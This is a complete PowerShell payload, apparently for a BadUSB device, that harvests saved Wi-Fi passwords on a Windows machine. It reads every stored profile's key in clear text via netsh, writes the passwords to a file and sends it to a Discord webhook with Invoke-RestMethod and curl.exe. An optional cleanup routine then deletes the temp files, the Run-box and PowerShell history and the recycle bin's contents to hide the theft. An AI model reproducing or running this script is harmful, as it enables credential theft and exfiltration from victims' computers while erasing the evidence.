############################################################################################################################################################

$wifiProfiles = netsh wlan show profiles | Select-String "utilisateur"
foreach ($wifiProfile in $wifiProfiles) {
    $wifiName = $wifiProfile -Split(":")
    $wifiName = $wifiName[1] -replace '\s',''
    $wifiPassInfo = netsh wlan show profile name=$wifiName key=clear | Select-String "contenu de la cl"
    $wifiPass = $wifiPassInfo -Split(":")
    $wifiPass = $wifiPass[1] -replace '\s',''
    "SSID : " + $wifiName + " | " + "Password : "+$wifiPass >> wifi-pass.txt
}

############################################################################################################################################################

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "wifi-pass.txt"}

 

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}


RI wifi-pass.txt